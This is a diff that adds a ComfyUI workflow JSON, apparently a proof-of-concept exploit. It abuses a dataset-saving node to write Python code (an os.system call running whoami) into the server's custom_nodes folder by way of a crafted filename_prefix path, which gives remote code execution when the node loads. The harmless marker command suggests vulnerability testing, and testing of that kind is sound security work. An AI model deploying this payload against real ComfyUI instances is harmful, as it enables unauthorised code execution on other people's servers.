@@ -1,0 +1,29 @@
+{
+  "10": {
+    "inputs": {
+      "width": 512,
+      "height": 512,
+      "batch_size": 1,
+      "color": 0
+    },
+    "class_type": "EmptyImage",
+    "_meta": {
+      "title": "Пустое изображение"
+    }
+  },
+  "11": {
+    "inputs": {
+      "texts": "import os\\nos.system('whoami > /tmp/RCE_ONLINE_TEST')\\nNODE_CLASS_MAPPINGS = {}\\n",
+      "folder_name": "x",
+      "filename_prefix": "/tmp/ComfyUI/custom_nodes/rce_30ad85fc1",
+      "images": [
+        "10",
+        0
+      ]
+    },
+    "class_type": "SaveImageTextDataSetToFolder",
+    "_meta": {
+      "title": "Сохранить набор изображений и текстов в папку"
+    }
+  }
+}
